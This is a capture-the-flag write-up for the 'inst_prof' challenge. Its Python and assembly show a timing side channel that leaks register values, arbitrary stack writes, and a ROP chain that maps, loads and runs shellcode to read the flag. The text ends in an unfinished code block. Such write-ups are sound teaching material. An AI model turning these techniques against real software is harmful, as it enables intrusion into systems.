# inst_prof

This challenge accepts 4 Bytes of Instructions and executes them in a tight loop, measuring the total runtime.
The Pseudocode looks as follows:

```C

void do_test()
{
    void *page = alloc_page()
    //Use the Template to prepare function
    read_inst(page); //Reads 4 Bytes from User
    make_page_executable(page)

    r12 = rdtsc;
    ((void (*)())page)();
    rdx = rdtsc - r12;

    write(1, rdx, 8);
    free_page(page);
}
```

The disassembly of the Page looks as follows:

```assembly
mv ecx, 0x1000
your_code:
<your 4 bytes>
sub ecx, 1
jne your_code
ret
```

## Leaking Stuff
First of all we noticed, that the registers r14 and r15 are not altered between two measurements.
This allows to preserve minimal state between two executions.
To leak registers, we stored the value to leak in r15 and extracted the value bit by bit.

```python
def leak_r15(lowest_bit=0, highest_bit=48):
    #skip not needed bits
    for n_bit in range(0, lowest_bit):
        execute("shr r15,1; ret")

    #leak
    leak = 0
    for n_bit in range(lowest_bit, highest_bit+1):
        #prepare bit mask
        execute("xor r14, r14")
        execute("inc r14; ret")
        execute("and r14, r15")

        #leak
        t = execute("sub r12, r14")
        bit = 0 if t < thres else 1
       leak |= bit * 2 ** ( n_bit)
        p2.status("%u/48 Leak: 0x%x Avg: %u", n_bit, leak, t)

        #shfit r15
        execute("shr r15,1; ret")

    return leak
```

As r12 holds the timestamp before the execution, the returned runtime can be artificialy increased depending on r14.


## Writing to Stack
To prepare the ropchain, we need to write arbitrary data to Stack.
The address we want to write to is stored in %r15
```python
def write_buff(what):
    for c in what:
        execute("movb [r15],0x%02x" % ord(c))
        execute("inc r15; ret")
```

## Exploit
The program already contains lots of nice gadgets, such as allocating page, read_n bytes and make_page executable.
We used this functions to allocate a new page, read arbitrary data to it
As the behavior for mmap is deterministic, we can compute the address from the newly allocated page, from the previous allocated one.
So first we have to leak the address of the old Page and of course the binary base address, to compute the rop gadgets:

```
execute("pop r15; push r15")
binary_base = leak_r15(lowest_bit=12,highest_bit=40) | 0x550000000000

execute("mov r15, rdi")
page_old = leak_r15(lowest_bit=12,highest_bit=48)

alloc_page = binary_base + 0x9f0
pop_rdi = binary_base + 0xbc3
read_n = binary_base + 0xa80
make_page_executable = binary_base + 0xa20
pop_rbx_r12_rbp = binary_base + 0xaab
call_rbx = binary_base + 0xb16


ropchain  = struct.pack("<Q", alloc_page)
ropchain += struct.pack("<Q", pop_rdi)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", read_n)
ropchain += struct.pack("<Q", pop_rdi)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", make_page_executable)
ropchain += struct.pack("<Q", pop_rbx_r12_rbp)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", page_old - 0x1000)
ropchain += struct.pack("<Q", call_rbx)
```

To write the ropchain without crashing the programm, we incremented rsp by 0x1000 and the chain before the main stack frame.

```python
execute("mov %r15, %rsp; ret")
execute("inc %r15")
write_buff(ropchain)
```

To execute the ropchain, 
```
execute("mov r15, rsp; ret")
execute("inc r15")
CODE = asm("mov rsp,r15; ret").ljust(4, asm("nop"))

con.send(CODE)
con.send(shellcode)
con.send("cat flag.txt\n")
